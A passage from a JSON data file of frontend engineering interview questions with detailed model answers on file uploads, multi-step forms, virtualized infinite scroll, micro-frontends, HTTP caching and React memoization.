Handling\n\n```typescript\ninterface UploadProgress {\n  fileId: string;\n  fileName: string;\n  progress: number;\n  status: 'pending' | 'uploading' | 'complete' | 'error';\n  url?: string;\n  error?: string;\n}\n\nfunction useFileUpload(fieldId: string) {\n  const [uploads, setUploads] = useState<Map<string, UploadProgress>>(new Map());\n  \n  const uploadFile = useCallback(async (file: File) => {\n    const fileId = nanoid();\n    \n    // Add to state\n    setUploads(prev => new Map(prev).set(fileId, {\n      fileId,\n      fileName: file.name,\n      progress: 0,\n      status: 'pending',\n    }));\n    \n    try {\n      // Get presigned URL\n      const { uploadUrl, fileUrl } = await getPresignedUrl(file.name, file.type);\n      \n      // Upload with progress tracking\n      await uploadWithProgress(uploadUrl, file, (progress) => {\n        setUploads(prev => {\n          const updated = new Map(prev);\n          const current = updated.get(fileId)!;\n          updated.set(fileId, { ...current, progress, status: 'uploading' });\n          return updated;\n        });\n      });\n      \n      // Mark complete\n      setUploads(prev => {\n        const updated = new Map(prev);\n        const current = updated.get(fileId)!;\n        updated.set(fileId, { ...current, progress: 100, status: 'complete', url: fileUrl });\n        return updated;\n      });\n      \n      return fileUrl;\n    } catch (error) {\n      setUploads(prev => {\n        const updated = new Map(prev);\n        const current = updated.get(fileId)!;\n        updated.set(fileId, { \n          ...current, \n          status: 'error', \n          error: error instanceof Error ? error.message : 'Upload failed' \n        });\n        return updated;\n      });\n      throw error;\n    }\n  }, []);\n  \n  return { uploads, uploadFile };\n}\n\nasync function uploadWithProgress(\n  url: string,\n  file: File,\n  onProgress: (progress: number) => void\n): Promise<void> {\n  return new Promise((resolve, reject) => {\n    const xhr = new XMLHttpRequest();\n    \n    xhr.upload.addEventListener('progress', (e) => {\n      if (e.lengthComputable) {\n        onProgress(Math.round((e.loaded / e.total) * 100));\n      }\n    });\n    \n    xhr.addEventListener('load', () => {\n      if (xhr.status >= 200 && xhr.status < 300) {\n        resolve();\n      } else {\n        reject(new Error(`Upload failed: ${xhr.status}`));\n      }\n    });\n    \n    xhr.addEventListener('error', () => reject(new Error('Network error')));\n    \n    xhr.open('PUT', url);\n    xhr.send(file);\n  });\n}\n```\n\n## Multi-Step Form Navigation\n\n```typescript\nfunction useMultiStepForm(schema: FormSchema) {\n  const [currentStepIndex, setCurrentStepIndex] = useState(0);\n  const [formData, setFormData] = useState<Record<string, unknown>>({});\n  const [stepErrors, setStepErrors] = useState<Record<number, Record<string, string>>>({});\n  \n  const visibleSteps = useMemo(() => {\n    return schema.steps.filter(step => {\n      if (!step.conditions?.length) return true;\n      return step.conditions.every(c => evaluateCondition(c, formData));\n    });\n  }, [schema.steps, formData]);\n  \n  const currentStep = visibleSteps[currentStepIndex];\n  const isFirstStep = currentStepIndex === 0;\n  const isLastStep = currentStepIndex === visibleSteps.length - 1;\n  \n  const validateCurrentStep = useCallback(() => {\n    const stepFields = currentStep.fields;\n    const stepSchema = z.object(\n      Object.fromEntries(stepFields.map(f => [f.id, createFieldSchema(f)]))\n    );\n    \n    const result = stepSchema.safeParse(formData);\n    \n    if (!result.success) {\n      const errors: Record<string, string> = {};\n      result.error.issues.forEach(issue => {\n        if (issue.path[0]) {\n          errors[issue.path[0].toString()] = issue.message;\n        }\n      });\n      setStepErrors(prev => ({ ...prev, [currentStepIndex]: errors }));\n      return false;\n    }\n    \n    setStepErrors(prev => ({ ...prev, [currentStepIndex]: {} }));\n    return true;\n  }, [currentStep, currentStepIndex, formData]);\n  \n  const goNext = useCallback(() => {\n    if (validateCurrentStep() && !isLastStep) {\n      setCurrentStepIndex(prev => prev + 1);\n    }\n  }, [validateCurrentStep, isLastStep]);\n  \n  const goPrev = useCallback(() => {\n    if (!isFirstStep) {\n      setCurrentStepIndex(prev => prev - 1);\n    }\n  }, [isFirstStep]);\n  \n  return {\n    currentStep,\n    currentStepIndex,\n    visibleSteps,\n    formData,\n    setFormData,\n    stepErrors: stepErrors[currentStepIndex] ?? {},\n    isFirstStep,\n    isLastStep,\n    goNext,\n    goPrev,\n    validateCurrentStep,\n  };\n}\n```\n\n## Key Architecture Decisions\n\n1. **Schema-Driven**: Form definition is pure data, enabling storage and reuse\n2. **Dynamic Validation**: Zod schemas generated at runtime from field definitions\n3. **Isolated File Uploads**: Each file uploads independently with progress tracking\n4. **Conditional Logic**: Evaluated on every form value change\n5. **Step Validation**: Validates only visible fields in current step",
      "keyPoints": [
        "Uses schema-driven architecture for flexibility",
        "Implements dynamic Zod schema generation",
        "Handles conditional logic with evaluation engine",
        "Manages file uploads with progress tracking",
        "Separates step validation from form validation"
      ],
      "followUpQuestions": [
        "How would you handle autosave for partially completed forms?",
        "How would you implement form analytics to track drop-off points?",
        "How would you support offline form completion?",
        "How would you make the form builder itself accessible?"
      ],
      "relatedTopics": [
        "form-validation",
        "zod",
        "file-upload",
        "conditional-logic"
      ],
      "source": "seed",
      "commonAt": [
        "Typeform",
        "JotForm",
        "Airtable"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "system-design-005",
      "category": "system-design",
      "difficulty": "mid",
      "question": "Explain how you would implement infinite scroll in a way that handles tens of thousands of items efficiently. What are the trade-offs compared to pagination?",
      "answer": "## Overview\n\nInfinite scroll for large datasets requires virtualization - only rendering items that are visible in the viewport plus a buffer zone. This prevents DOM node explosion while maintaining scroll physics.\n\n## Virtualization Implementation\n\n```typescript\nimport { useVirtualizer } from '@tanstack/react-virtual';\nimport { useInfiniteQuery } from '@tanstack/react-query';\n\ninterface Item {\n  id: string;\n  title: string;\n  // ... other fields\n}\n\nfunction VirtualizedInfiniteList() {\n  const parentRef = useRef<HTMLDivElement>(null);\n  \n  // Fetch data in pages\n  const {\n    data,\n    fetchNextPage,\n    hasNextPage,\n    isFetchingNextPage,\n  } = useInfiniteQuery({\n    queryKey: ['items'],\n    queryFn: async ({ pageParam = 0 }) => {\n      const response = await fetch(`/api/items?cursor=${pageParam}&limit=50`);\n      return response.json() as Promise<{ items: Item[]; nextCursor: string | null }>;\n    },\n    getNextPageParam: (lastPage) => lastPage.nextCursor,\n    initialPageParam: 0,\n  });\n  \n  // Flatten all pages into single array\n  const allItems = useMemo(\n    () => data?.pages.flatMap(page => page.items) ?? [],\n    [data]\n  );\n  \n  // Virtual list configuration\n  const virtualizer = useVirtualizer({\n    count: hasNextPage ? allItems.length + 1 : allItems.length,\n    getScrollElement: () => parentRef.current,\n    estimateSize: () => 72, // Estimated row height\n    overscan: 5, // Render 5 extra items above/below viewport\n  });\n  \n  const virtualItems = virtualizer.getVirtualItems();\n  \n  // Trigger fetch when approaching end\n  useEffect(() => {\n    const lastItem = virtualItems[virtualItems.length - 1];\n    \n    if (\n      lastItem &&\n      lastItem.index >= allItems.length - 1 &&\n      hasNextPage &&\n      !isFetchingNextPage\n    ) {\n      fetchNextPage();\n    }\n  }, [virtualItems, allItems.length, hasNextPage, isFetchingNextPage, fetchNextPage]);\n  \n  return (\n    <div\n      ref={parentRef}\n      className=\"h-[600px] overflow-auto\"\n    >\n      <div\n        style={{\n          height: virtualizer.getTotalSize(),\n          width: '100%',\n          position: 'relative',\n        }}\n      >\n        {virtualItems.map((virtualRow) => {\n          const isLoaderRow = virtualRow.index >= allItems.length;\n          const item = allItems[virtualRow.index];\n          \n          return (\n            <div\n              key={virtualRow.key}\n              data-index={virtualRow.index}\n              ref={virtualizer.measureElement}\n              style={{\n                position: 'absolute',\n                top: 0,\n                left: 0,\n                width: '100%',\n                transform: `translateY(${virtualRow.start}px)`,\n              }}\n            >\n              {isLoaderRow ? (\n                <LoadingSpinner />\n              ) : (\n                <ItemRow item={item} />\n              )}\n            </div>\n          );\n        })}\n      </div>\n    </div>\n  );\n}\n```\n\n## Variable Height Items\n\n```typescript\n// For items with unpredictable heights (images, text)\nconst virtualizer = useVirtualizer({\n  count: items.length,\n  getScrollElement: () => parentRef.current,\n  // Dynamic measurement instead of fixed estimate\n  estimateSize: useCallback((index) => {\n    // Return cached size if measured, estimate otherwise\n    return measuredSizes.current.get(index) ?? 100;\n  }, []),\n  measureElement: (element) => {\n    // Measure actual rendered height\n    return element.getBoundingClientRect().height;\n  },\n});\n\n// Handle resize\nuseEffect(() => {\n  const observer = new ResizeObserver((entries) => {\n    for (const entry of entries) {\n      const index = Number(entry.target.dataset.index);\n      const height = entry.contentRect.height;\n      \n      if (measuredSizes.current.get(index) !== height) {\n        measuredSizes.current.set(index, height);\n        virtualizer.measure(); // Re-calculate positions\n      }\n    }\n  });\n  \n  // Observe all rendered items\n  const elements = parentRef.current?.querySelectorAll('[data-index]');\n  elements?.forEach(el => observer.observe(el));\n  \n  return () => observer.disconnect();\n}, [virtualItems]);\n```\n\n## Scroll Position Restoration\n\n```typescript\nfunction useScrollRestoration(key: string) {\n  const parentRef = useRef<HTMLDivElement>(null);\n  \n  // Save scroll position on unmount\n  useEffect(() => {\n    const element = parentRef.current;\n    \n    return () => {\n      if (element) {\n        sessionStorage.setItem(\n          `scroll-${key}`,\n          JSON.stringify({ top: element.scrollTop })\n        );\n      }\n    };\n  }, [key]);\n  \n  // Restore scroll position on mount\n  useLayoutEffect(() => {\n    const saved = sessionStorage.getItem(`scroll-${key}`);\n    if (saved && parentRef.current) {\n      const { top } = JSON.parse(saved);\n      parentRef.current.scrollTop = top;\n    }\n  }, [key]);\n  \n  return parentRef;\n}\n```\n\n## Trade-offs: Infinite Scroll vs Pagination\n\n| Aspect | Infinite Scroll | Pagination |\n|--------|-----------------|------------|\n| **User Engagement** | Higher - seamless browsing | Lower - requires clicks |\n| **Performance** | Requires virtualization | Simpler, fixed DOM size |\n| **Deep Linking** | Difficult - no stable URLs | Easy - page URLs |\n| **SEO** | Poor without SSR | Excellent |\n| **Memory** | Can grow unbounded | Fixed per page |\n| **Footer Access** | Impossible with infinite content | Easy |\n| **Accessibility** | Complex focus management | Standard navigation |\n| **Back Button** | Breaks without state management | Works naturally |\n\n## When to Use Each\n\n**Infinite Scroll:**\n- Social feeds (Twitter, Instagram)\n- Image galleries\n- Chat/messaging\n- Discovery-focused browsing\n\n**Pagination:**\n- Search results\n- Admin dashboards\n- Data tables\n- E-commerce product listings\n- Content that needs deep linking\n\n## Hybrid Approach: \"Load More\"\n\n```typescript\n// Best of both worlds\nfunction LoadMoreList() {\n  const [page, setPage] = useState(1);\n  const { data, isLoading } = useQuery({\n    queryKey: ['items', page],\n    queryFn: () => fetchItems(page),\n  });\n  \n  return (\n    <div>\n      {data?.items.map(item => (\n        <ItemRow key={item.id} item={item} />\n      ))}\n      \n      {data?.hasMore && (\n        <button\n          onClick={() => setPage(p => p + 1)}\n          disabled={isLoading}\n        >\n          {isLoading ? 'Loading...' : 'Load More'}\n        </button>\n      )}\n    </div>\n  );\n}\n```\n\n## Performance Considerations\n\n1. **Overscan**: Render extra items outside viewport to prevent flashing\n2. **Key Stability**: Use stable item IDs, not array indices\n3. **Debounce Scroll**: Don't fetch on every scroll event\n4. **Memory Limits**: Consider evicting old pages when list grows too large\n5. **Skeleton Loading**: Show placeholders during fetch",
      "keyPoints": [
        "Understands virtualization is essential for large lists",
        "Knows TanStack Virtual or similar libraries",
        "Can implement scroll position restoration",
        "Articulates trade-offs between approaches",
        "Considers accessibility implications",
        "Mentions hybrid \"load more\" pattern"
      ],
      "followUpQuestions": [
        "How would you handle items that expand/collapse with variable heights?",
        "How would you implement \"jump to\" functionality in a virtualized list?",
        "What if items can be reordered by the user?",
        "How would you handle infinite scroll with filters that change the dataset?"
      ],
      "relatedTopics": [
        "virtualization",
        "pagination",
        "intersection-observer",
        "performance"
      ],
      "source": "seed",
      "commonAt": [
        "Meta",
        "Twitter",
        "Pinterest"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "system-design-006",
      "category": "system-design",
      "difficulty": "senior",
      "question": "Design a micro-frontend architecture for a large e-commerce platform where different teams own different parts of the application (product catalog, cart, checkout, user account). How would you handle shared state, routing, and deployments?",
      "answer": "## Overview\n\nMicro-frontends allow independent teams to develop, test, and deploy their features autonomously. The key challenges are shared state, consistent UX, and performance optimization across module boundaries.\n\n## Architecture Options\n\n### 1. Module Federation (Recommended for React)\n\n```javascript\n// webpack.config.js - Shell Application\nconst { ModuleFederationPlugin } = require('webpack').container;\n\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'shell',\n      remotes: {\n        catalog: 'catalog@https://catalog.example.com/remoteEntry.js',\n        cart: 'cart@https://cart.example.com/remoteEntry.js',\n        checkout: 'checkout@https://checkout.example.com/remoteEntry.js',\n        account: 'account@https://account.example.com/remoteEntry.js',\n      },\n      shared: {\n        react: { singleton: true, requiredVersion: '^18.0.0' },\n        'react-dom': { singleton: true, requiredVersion: '^18.0.0' },\n        '@company/design-system': { singleton: true },\n      },\n    }),\n  ],\n};\n\n// webpack.config.js - Catalog Micro-frontend\nmodule.exports = {\n  plugins: [\n    new ModuleFederationPlugin({\n      name: 'catalog',\n      filename: 'remoteEntry.js',\n      exposes: {\n        './ProductList': './src/components/ProductList',\n        './ProductDetail': './src/pages/ProductDetail',\n        './SearchBar': './src/components/SearchBar',\n      },\n      shared: {\n        react: { singleton: true, requiredVersion: '^18.0.0' },\n        'react-dom': { singleton: true, requiredVersion: '^18.0.0' },\n      },\n    }),\n  ],\n};\n```\n\n### 2. Shell Application Structure\n\n```typescript\n// Shell app - handles routing and composition\nimport { lazy, Suspense } from 'react';\nimport { BrowserRouter, Routes, Route } from 'react-router-dom';\n\n// Dynamic imports from federated modules\nconst ProductList = lazy(() => import('catalog/ProductList'));\nconst ProductDetail = lazy(() => import('catalog/ProductDetail'));\nconst Cart = lazy(() => import('cart/CartPage'));\nconst Checkout = lazy(() => import('checkout/CheckoutFlow'));\nconst Account = lazy(() => import('account/AccountDashboard'));\n\nfunction App() {\n  return (\n    <BrowserRouter>\n      <GlobalProviders>\n        <Header />\n        <ErrorBoundary fallback={<ErrorPage />}>\n          <Suspense fallback={<PageSkeleton />}>\n            <Routes>\n              <Route path=\"/products\" element={<ProductList />} />\n              <Route path=\"/products/:id\" element={<ProductDetail />} />\n              <Route path=\"/cart\" element={<Cart />} />\n              <Route path=\"/checkout/*\" element={<Checkout />} />\n              <Route path=\"/account/*\" element={<Account />} />\n            </Routes>\n          </Suspense>\n        </ErrorBoundary>\n        <Footer />\n      </GlobalProviders>\n    </BrowserRouter>\n  );\n}\n```\n\n## Shared State Management\n\n### Event Bus Pattern\n\n```typescript\n// Shared event bus for cross-module communication\ntype EventMap = {\n  'cart:item-added': { productId: string; quantity: number };\n  'cart:item-removed': { productId: string };\n  'cart:updated': { itemCount: number; total: number };\n  'user:logged-in': { userId: string };\n  'user:logged-out': undefined;\n};\n\nclass EventBus {\n  private listeners = new Map<string, Set<Function>>();\n\n  emit<K extends keyof EventMap>(event: K, data: EventMap[K]) {\n    const handlers = this.listeners.get(event);\n    handlers?.forEach(handler => handler(data));\n  }\n\n  on<K extends keyof EventMap>(\n    event: K,\n    handler: (data: EventMap[K]) => void\n  ): () => void {\n    if (!this.listeners.has(event)) {\n      this.listeners.set(event, new Set());\n    }\n    this.listeners.get(event)!.add(handler);\n    \n    return () => this.listeners.get(event)?.delete(handler);\n  }\n}\n\n// Singleton instance shared across modules\nexport const eventBus = new EventBus();\n\n// Usage in Cart module\neventBus.emit('cart:item-added', { productId: '123', quantity: 2 });\n\n// Usage in Header component (Shell)\nuseEffect(() => {\n  return eventBus.on('cart:updated', ({ itemCount }) => {\n    setCartBadge(itemCount);\n  });\n}, []);\n```\n\n### Shared State Store\n\n```typescript\n// @company/shared-state package\nimport { create } from 'zustand';\nimport { subscribeWithSelector } from 'zustand/middleware';\n\ninterface SharedState {\n  // Cart state\n  cart: {\n    items: CartItem[];\n    total: number;\n  };\n  \n  // User state\n  user: {\n    isAuthenticated: boolean;\n    profile: UserProfile | null;\n  };\n  \n  // Actions\n  addToCart: (item: CartItem) => void;\n  removeFromCart: (productId: string) => void;\n  setUser: (user: UserProfile | null) => void;\n}\n\n// Create store with persistence\nexport const useSharedStore = create<SharedState>()(\n  subscribeWithSelector(\n    persist(\n      (set) => ({\n        cart: { items: [], total: 0 },\n        user: { isAuthenticated: false, profile: null },\n        \n        addToCart: (item) =>\n          set((state) => {\n            const items = [...state.cart.items, item];\n            return {\n              cart: {\n                items,\n                total: items.reduce((sum, i) => sum + i.price * i.quantity, 0),\n              },\n            };\n          }),\n          \n        removeFromCart: (productId) =>\n          set((state) => {\n            const items = state.cart.items.filter(i => i.productId !== productId);\n            return {\n              cart: {\n                items,\n                total: items.reduce((sum, i) => sum + i.price * i.quantity, 0),\n              },\n            };\n          }),\n          \n        setUser: (profile) =>\n          set({\n            user: {\n              isAuthenticated: !!profile,\n              profile,\n            },\n          }),\n      }),\n      { name: 'shared-state' }\n    )\n  )\n);\n\n// Selector hooks for specific slices\nexport const useCart = () => useSharedStore((state) => state.cart);\nexport const useUser = () => useSharedStore((state) => state.user);\n```\n\n## Routing Strategy\n\n```typescript\n// Shell owns top-level routes, delegates to micro-frontends\n// Each micro-frontend handles its own sub-routes\n\n// Checkout micro-frontend internal routing\nfunction CheckoutFlow() {\n  return (\n    <Routes>\n      <Route index element={<ShippingStep />} />\n      <Route path=\"payment\" element={<PaymentStep />} />\n      <Route path=\"review\" element={<ReviewStep />} />\n      <Route path=\"confirmation/:orderId\" element={<Confirmation />} />\n    </Routes>\n  );\n}\n\n// Cross-module navigation\nimport { useNavigate } from 'react-router-dom';\n\nfunction AddToCartButton({ product }: { product: Product }) {\n  const navigate = useNavigate();\n  const addToCart = useSharedStore((s) => s.addToCart);\n  \n  const handleClick = () => {\n    addToCart({\n      productId: product.id,\n      name: product.name,\n      price: product.price,\n      quantity: 1,\n    });\n    \n    // Navigate to cart (owned by different team)\n    navigate('/cart');\n  };\n  \n  return <button onClick={handleClick}>Add to Cart</button>;\n}\n```\n\n## Deployment Strategy\n\n```yaml\n# Each micro-frontend has independent CI/CD\n# Shell monitors health of all remotes\n\n# catalog-deploy.yml\nname: Deploy Catalog\non:\n  push:\n    branches: [main]\n    paths:\n      - 'apps/catalog/**'\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Build\n        run: |\n          cd apps/catalog\n          npm ci\n          npm run build\n          \n      - name: Deploy to CDN\n        run: |\n          aws s3 sync dist/ s3://mfe-catalog/\n          aws cloudfront create-invalidation --distribution-id ${{ secrets.CF_DIST_ID }}\n          \n      - name: Health Check\n        run: |\n          curl -f https://catalog.example.com/remoteEntry.js || exit 1\n          \n      - name: Notify Shell\n        run: |\n          # Optional: trigger shell to update remote version\n          curl -X POST https://shell.example.com/api/mfe-updated \\\n            -d '{\"module\": \"catalog\", \"version\": \"${{ github.sha }}\"}'\n```\n\n## Version Management\n\n```typescript\n// Dynamic remote loading with version control\nasync function loadRemote(moduleName: string) {\n  // Fetch current versions from config service\n  const config = await fetch('/api/mfe-config').then(r => r.json());\n  const remoteUrl = config.remotes[moduleName];\n  \n  // Dynamically inject script\n  await new Promise<void>((resolve, reject) => {\n    const script = document.createElement('script');\n    script.src = remoteUrl;\n    script.onload = () => resolve();\n    script.onerror = () => reject(new Error(`Failed to load ${moduleName}`));\n    document.head.appendChild(script);\n  });\n  \n  // Access federated module\n  // @ts-expect-error - dynamic federation\n  return window[moduleName];\n}\n\n// Graceful degradation\nfunction MicroFrontendLoader({ \n  module, \n  fallback \n}: { \n  module: string; \n  fallback: React.ReactNode;\n}) {\n  const [Component, setComponent] = useState<React.ComponentType | null>(null);\n  const [error, setError] = useState<Error | null>(null);\n  \n  useEffect(() => {\n    loadRemote(module)\n      .then((remote) => setComponent(() => remote.default))\n      .catch(setError);\n  }, [module]);\n  \n  if (error) return <>{fallback}</>;\n  if (!Component) return <LoadingSpinner />;\n  \n  return <Component />;\n}\n```\n\n## Key Considerations\n\n1. **Shared Dependencies**: Use singleton pattern for React, design system\n2. **CSS Isolation**: CSS Modules or CSS-in-JS with unique prefixes\n3. **Error Boundaries**: Isolate failures to individual micro-frontends\n4. **Performance**: Lazy load micro-frontends, shared chunks for common code\n5. **Testing**: Contract tests between shell and micro-frontends\n6. **Monitoring**: Track load times, errors per micro-frontend",
      "keyPoints": [
        "Understands Module Federation mechanics",
        "Can design event-based cross-module communication",
        "Knows shared state patterns (store vs event bus)",
        "Considers independent deployment strategies",
        "Addresses version management and rollback",
        "Mentions error boundaries for isolation"
      ],
      "followUpQuestions": [
        "How would you handle a micro-frontend that needs to be SSR'd?",
        "What if two teams need to share a complex component?",
        "How would you implement feature flags across micro-frontends?",
        "How do you ensure consistent styling across teams?"
      ],
      "relatedTopics": [
        "module-federation",
        "webpack",
        "deployment",
        "state-management"
      ],
      "source": "seed",
      "commonAt": [
        "Amazon",
        "IKEA",
        "Spotify",
        "Zalando"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "caching-memoization-001",
      "category": "caching-memoization",
      "difficulty": "senior",
      "question": "Explain the complete HTTP caching lifecycle. How do Cache-Control headers work, and what's the difference between browser cache, CDN cache, and application-level cache?",
      "answer": "## HTTP Caching Lifecycle\n\n### 1. Cache-Control Headers Deep Dive\n\n```\nClient Request\n     â”‚\n     â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     Cache Miss      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚   Browser   â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º â”‚     CDN     â”‚\nâ”‚    Cache    â”‚                     â”‚    Cache    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n     â”‚ Cache Hit                          â”‚ Cache Miss\n     â–¼                                    â–¼\n  Response                          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\n                                    â”‚   Origin    â”‚\n                                    â”‚   Server    â”‚\n                                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### Cache-Control Directives\n\n```http\n# Maximum caching - static assets with hash in filename\nCache-Control: public, max-age=31536000, immutable\n\n# API responses - no caching\nCache-Control: no-store\n\n# Dynamic pages - cache but revalidate\nCache-Control: private, no-cache, must-revalidate\n\n# Shared cache (CDN) different from browser\nCache-Control: public, max-age=60, s-maxage=3600, stale-while-revalidate=86400\n```\n\n**Directive meanings:**\n\n| Directive | Meaning |\n|-----------|---------|\n| `public` | Can be cached by CDN and browser |\n| `private` | Only browser can cache (user-specific data) |\n| `max-age=N` | Fresh for N seconds |\n| `s-maxage=N` | CDN-specific max-age (overrides max-age for shared caches) |\n| `no-cache` | Must revalidate with server before using |\n| `no-store` | Never cache (sensitive data) |\n| `must-revalidate` | Don't serve stale on error |\n| `stale-while-revalidate=N` | Serve stale while fetching fresh in background |\n| `immutable` | Content will never change (skip revalidation) |\n\n### 2. ETag and Conditional Requests\n\n```typescript\n// Server generates ETag from content hash\napp.get('/api/user/:id', async (req, res) => {\n  const user = await getUser(req.params.id);\n  const etag = crypto\n    .createHash('md5')\n    .update(JSON.stringify(user))\n    .digest('hex');\n  \n  // Check if client has current version\n  if (req.headers['if-none-match'] === etag) {\n    return res.status(304).end(); // Not Modified\n  }\n  \n  res.set({\n    'ETag': etag,\n    'Cache-Control': 'private, no-cache',\n  });\n  res.json(user);\n});\n```\n\n**Conditional request flow:**\n1. First request: Server returns data + ETag\n2. Browser caches response with ETag\n3. Subsequent requests: Browser sends `If-None-Match: <etag>`\n4. Server compares ETags:\n   - Match â†’ 304 Not Modified (no body)\n   - No match â†’ 200 with new data + new ETag\n\n### 3. Three Layers of Caching\n\n#### Browser Cache (Private)\n\n```typescript\n// Service Worker for fine-grained control\nself.addEventListener('fetch', (event) => {\n  event.respondWith(\n    caches.match(event.request).then((cached) => {\n      // Cache-first strategy\n      if (cached) {\n        // Update cache in background\n        fetch(event.request).then((response) => {\n          caches.open('v1').then((cache) => {\n            cache.put(event.request, response);\n          });\n        });\n        return cached;\n      }\n      \n      // Network fallback\n      return fetch(event.request);\n    })\n  );\n});\n```\n\n#### CDN Cache (Shared)\n\n```typescript\n// Next.js ISR - CDN + Origin coordination\nexport const revalidate = 60; // Revalidate every 60 seconds\n\nexport default async function ProductPage({ params }: { params: { id: string } }) {\n  const product = await getProduct(params.id);\n  \n  // This page will be:\n  // 1. Generated at build time\n  // 2. Served from CDN cache\n  // 3. Revalidated in background after 60s\n  \n  return <ProductDetails product={product} />;\n}\n```\n\n#### Application Cache (In-Memory)\n\n```typescript\n// React Query with stale-while-revalidate pattern\nconst { data: user } = useQuery({\n  queryKey: ['user', userId],\n  queryFn: () => fetchUser(userId),\n  staleTime: 5 * 60 * 1000, // Fresh for 5 minutes\n  gcTime: 30 * 60 * 1000, // Keep in memory for 30 minutes\n});\n\n// Manual cache with Map\nconst cache = new Map<string, { data: unknown; timestamp: number }>();\nconst TTL = 60_000; // 1 minute\n\nasync function cachedFetch<T>(key: string, fetcher: () => Promise<T>): Promise<T> {\n  const cached = cache.get(key);\n  \n  if (cached && Date.now() - cached.timestamp < TTL) {\n    return cached.data as T;\n  }\n  \n  const data = await fetcher();\n  cache.set(key, { data, timestamp: Date.now() });\n  \n  return data;\n}\n```\n\n### 4. Cache Invalidation Strategies\n\n```typescript\n// 1. Time-based (TTL)\nCache-Control: max-age=3600\n\n// 2. Version-based (Cache busting)\n<script src=\"/app.js?v=1.2.3\"></script>\n<script src=\"/app.a1b2c3d4.js\"></script> // Content hash\n\n// 3. Event-based (Webhooks)\nasync function handleProductUpdate(productId: string) {\n  // Purge CDN cache\n  await fetch('https://api.cdn.com/purge', {\n    method: 'POST',\n    body: JSON.stringify({ paths: [`/products/${productId}`] }),\n  });\n  \n  // Invalidate React Query cache\n  queryClient.invalidateQueries({ queryKey: ['product', productId] });\n}\n\n// 4. Tag-based (Surrogate keys)\n// Response header: Surrogate-Key: product-123 category-shoes\n// Purge all products in category: purge tag \"category-shoes\"\n```\n\n### 5. Common Caching Patterns\n\n```typescript\n// Stale-While-Revalidate in JavaScript\nasync function swr<T>(\n  key: string,\n  fetcher: () => Promise<T>,\n  options: { staleTime: number; revalidate: boolean } = { staleTime: 60000, revalidate: true }\n): Promise<T> {\n  const cached = cache.get(key);\n  const now = Date.now();\n  \n  // Return stale data immediately if available\n  if (cached) {\n    const isStale = now - cached.timestamp > options.staleTime;\n    \n    if (isStale && options.revalidate) {\n      // Revalidate in background (don't await)\n      fetcher().then(data => {\n        cache.set(key, { data, timestamp: Date.now() });\n      });\n    }\n    \n    return cached.data as T;\n  }\n  \n  // No cache - fetch and wait\n  const data = await fetcher();\n  cache.set(key, { data, timestamp: now });\n  return data;\n}\n```\n\n## Key Differences Summary\n\n| Aspect | Browser Cache | CDN Cache | App Cache |\n|--------|---------------|-----------|-----------|\n| **Location** | User's device | Edge servers | App memory/DB |\n| **Scope** | Single user | All users | Configurable |\n| **Control** | Cache-Control headers | CDN config + headers | Application code |\n| **Invalidation** | Headers, versioning | Purge API, TTL | Manual, events |\n| **Use case** | Static assets, user data | Global static content | Computed data, API responses |",
      "keyPoints": [
        "Understands all Cache-Control directives",
        "Knows ETag/conditional request flow",
        "Can explain three cache layers and their purposes",
        "Understands stale-while-revalidate pattern",
        "Knows cache invalidation strategies",
        "Can implement cache in JavaScript"
      ],
      "followUpQuestions": [
        "When would you use no-cache vs no-store?",
        "How do you handle cache invalidation for user-specific data?",
        "What's the tradeoff between long max-age and cache busting?",
        "How would you implement offline-first caching?"
      ],
      "relatedTopics": [
        "http-headers",
        "cdn",
        "service-worker",
        "react-query"
      ],
      "source": "seed",
      "commonAt": [
        "Cloudflare",
        "Vercel",
        "Netflix"
      ],
      "createdAt": "2026-01-03T11:53:57.761Z",
      "updatedAt": "2026-01-03T11:53:57.761Z",
      "isArchived": false
    },
    {
      "id": "caching-memoization-002",
      "category": "caching-memoization",
      "difficulty": "mid",
      "question": "What's the difference between useMemo and useCallback in React? When would you use each, and what are the common pitfalls?",
      "answer": "## Core Difference\n\n```typescript\n// useMemo: Memoizes a COMPUTED VALUE\nconst expensiveValue = useMemo(() => {\n  return computeExpensiveValue(a, b);\n}, [a, b]);\n\n// useCallback: Memoizes a FUNCTION REFERENCE\nconst handleClick = useCallback(() => {\n  doSomething(a, b);\n}, [a, b]);\n\n// useCallback is actually syntactic sugar for:\nconst handleClick = useMemo(() => {\n  return () => doSomething(a, b);\n}, [a, b]);\n```\n\n## When to Use useMemo\n\n### 1. Expensive Calculations\n\n```typescript\nfunction ProductList({ products, filters }: Props) {\n  // âœ… Good: Filtering/sorting large arrays\n  const filteredProducts = useMemo(() => {\n    return products\n      .filter(p => p.category === filters.category)\n      .filter(p => p.price >= filters.minPrice)\n      .sort((a, b) => a.price - b.price);\n  }, [products, filters.category, filters.minPrice]);\n\n  return (\n    <ul>\n      {filteredProducts.map(product => (\n        <ProductCard key={product.id} product={product} />\n      ))}\n    </ul>\n  );\n}\n```\n\n### 2. Referential Equality for useEffect\n\n```typescript\nfunction SearchResults({ query }: { query: string }) {\n  // âœ… Good: Object reference used in dependency array\n  const searchParams = useMemo(() => ({\n    query,\n    limit: 20,\n    offset: 0,\n  }), [query]);\n\n  useEffect(() => {\n    fetchResults(searchParams);\n  }, [searchParams]); // Won't re-run unless query changes\n\n  // âŒ Bad: New object every 